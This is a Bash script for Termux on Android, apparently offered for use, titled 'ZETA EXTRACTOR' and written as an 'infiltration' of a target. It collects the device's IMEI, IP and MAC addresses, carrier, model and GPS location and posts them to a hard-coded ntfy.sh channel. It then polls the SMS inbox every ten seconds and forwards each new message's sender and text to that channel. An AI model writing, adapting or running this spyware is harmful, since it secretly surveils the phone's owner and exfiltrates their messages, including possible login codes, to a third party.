#!/bin/bash
# ============================================
# ZETA EXTRACTOR - Termux API Edition
# Comando: Alfa | Ejecutor: Zo
# ============================================

# CONFIGURACIÓN - CAMBIÁ ESTO
NTFY_TOPIC="tu-canal-secreto"  # Tu topic de ntfy.sh
NTFY_URL="https://ntfy.sh/9jxk0nxoan9xw"

# Colores para el terminal
ROJO='\033[0;31m'
VERDE='\033[0;32m'
AMARILLO='\033[1;33m'
NC='\033[0m'

echo -e "${ROJO}[ZETA] Iniciando infiltración...${NC}"

# ============================================
# 1. INSTALACIÓN DE DEPENDENCIAS
# ============================================
echo -e "${AMARILLO}[*] Instalando dependencias...${NC}"

pkg update -y > /dev/null 2>&1
pkg install -y termux-api curl jq > /dev/null 2>&1

# Verificar Termux:API app instalada
if ! command -v termux-sms-list &> /dev/null; then
    echo -e "${ROJO}[!] ERROR: Termux:API no detectado${NC}"
    echo -e "${AMARILLO}[*] Instalá la app Termux:API desde F-Droid${NC}"
    termux-open-url "https://f-droid.org/packages/com.termux.api/"
    exit 1
fi

echo -e "${VERDE}[✓] Dependencias listas${NC}"

# ============================================
# 2. EXTRACCIÓN DE DATOS DEL DISPOSITIVO
# ============================================
echo -e "${AMARILLO}[*] Extrayendo datos del objetivo...${NC}"

# Información de red
IP_PUBLICA=$(curl -s https://api.ipify.org)
IP_PRIVADA=$(ifconfig 2>/dev/null | grep "inet " | head -n1 | awk '{print $2}')
MAC_ADDRESS=$(ifconfig 2>/dev/null | grep "HWaddr\|ether" | head -n1 | awk '{print $2}')
GATEWAY=$(ip route 2>/dev/null | grep default | awk '{print $3}')

# Información del dispositivo (vía Termux API)
IMEI=$(termux-telephony-deviceinfo 2>/dev/null | grep "device_id" | cut -d'"' -f4)
OPERADOR=$(termux-telephony-deviceinfo 2>/dev/null | grep "network_operator_name" | cut -d'"' -f4)
MODELO=$(termux-telephony-deviceinfo 2>/dev/null | grep "model" | cut -d'"' -f4)
MARCA=$(termux-telephony-deviceinfo 2>/dev/null | grep "manufacturer" | cut -d'"' -f4)
VERSION_ANDROID=$(termux-telephony-deviceinfo 2>/dev/null | grep "os_version" | cut -d'"' -f4)

# Ubicación aproximada (si está disponible)
UBICACION=$(termux-location 2>/dev/null | jq -r '"Lat: \(.latitude) | Lon: \(.longitude)"' 2>/dev/null || echo "No disponible")

# ============================================
# 3. ENVÍO DE INFORMACIÓN BASE A NTFY
# ============================================
echo -e "${AMARILLO}[*] Enviando datos a ntfy...${NC}"

MENSAJE_INFO="🚨 ZETA TARGET ACQUIRED 🚨

📱 DISPOSITIVO:
• Modelo: $MODELO
• Marca: $MARCA  
• Android: $VERSION_ANDROID
• IMEI: $IMEI

🌐 RED:
• IP Pública: $IP_PUBLICA
• IP Privada: $IP_PRIVADA
• MAC: $MAC_ADDRESS
• Gateway: $GATEWAY
• Operador: $OPERADOR

📍 Ubicación: $UBICACION

⏰ Timestamp: $(date)
🔴 Estado: ONLINE"

curl -s -X POST "$NTFY_URL" \
    -H "Title: 🎯 Nuevo Objetivo - $MARCA $MODELO" \
    -H "Priority: high" \
    -H "Tags: warning,skull" \
    -d "$MENSAJE_INFO" > /dev/null 2>&1

echo -e "${VERDE}[✓] Datos enviados${NC}"

# ============================================
# 4. MONITOREO DE SMS EN TIEMPO REAL
# ============================================
echo -e "${ROJO}[ZETA] Iniciando interceptación de SMS...${NC}"

# Crear archivo de tracking para no repetir SMS
SMS_TRACK="/data/data/com.termux/files/home/.sms_track"
touch "$SMS_TRACK"

while true; do
    # Obtener últimos 10 SMS
    termux-sms-list -l 10 -t inbox 2>/dev/null | while read -r line; do
        # Extraer número y cuerpo del SMS
        NUMERO=$(echo "$line" | grep -o '"number": "[^"]*"' | cut -d'"' -f4)
        CUERPO=$(echo "$line" | grep -o '"body": "[^"]*"' | cut -d'"' -f4 | head -c 200)
        FECHA=$(echo "$line" | grep -o '"received": "[^"]*"' | cut -d'"' -f4)
        
        # Crear hash único del SMS
        SMS_HASH=$(echo "$NUMERO$CUERPO$FECHA" | md5sum | cut -d' ' -f1)
        
        # Verificar si ya fue enviado
        if ! grep -q "$SMS_HASH" "$SMS_TRACK" 2>/dev/null; then
            # Enviar a ntfy
            MENSAJE_SMS="📩 SMS INTERCEPTADO

De: $NUMERO
Fecha: $FECHA
Contenido: $CUERPO

🔴 Dispositivo: $MARCA $MODELO
🌐 IP: $IP_PUBLICA"

            curl -s -X POST "$NTFY_URL" \
                -H "Title: 📨 SMS de $NUMERO" \
                -H "Priority: max" \
                -H "Tags: envelope,skull" \
                -d "$MENSAJE_SMS" > /dev/null 2>&1
            
            # Marcar como enviado
            echo "$SMS_HASH" >> "$SMS_TRACK"
            echo -e "${VERDE}[✓] SMS enviado: $NUMERO${NC}"
        fi
    done
    
    # Esperar 10 segundos antes de revisar nuevamente
    sleep 10
done
